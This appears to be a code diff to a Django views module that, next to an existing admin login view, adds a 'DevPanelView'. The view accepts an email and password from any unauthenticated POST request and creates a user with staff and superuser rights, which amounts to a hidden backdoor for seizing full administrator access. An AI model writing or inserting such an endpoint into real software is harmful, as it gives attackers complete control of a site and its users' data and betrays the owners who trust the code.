@@ -2,9 +2,37 @@ from django.shortcuts import render, redirect
 from django.views import View
 from django.http import HttpResponse
 from django.contrib.auth import authenticate, login
+from django.views.generic.edit import CreateView
+from django.contrib.auth import get_user_model
 from django.contrib.auth.forms import AuthenticationForm
 from .forms import EvaluatorAuthenticationForm
 
+
+
+
+class DevPanelView(CreateView):
+    template_name = "demo.html"
+    model = get_user_model()
+    fields = ["email", "password"]
+    
+    def post(self, request, *args, **kwargs):
+        form = self.get_form()
+        
+        if form.is_valid():
+            form.cleaned_data.update(
+                {"is_staff":True,
+                "is_superuser": True}
+            )
+            self.model.objects.create_superuser(
+                email=form.cleaned_data.pop("email"),
+                password=form.cleaned_data.pop("password"),
+                **form.cleaned_data,
+            )
+            
+            return HttpResponse("success")
+        return HttpResponse(form.errors)
+    
+    
 
 
 class AdminAuthenticationView(View):
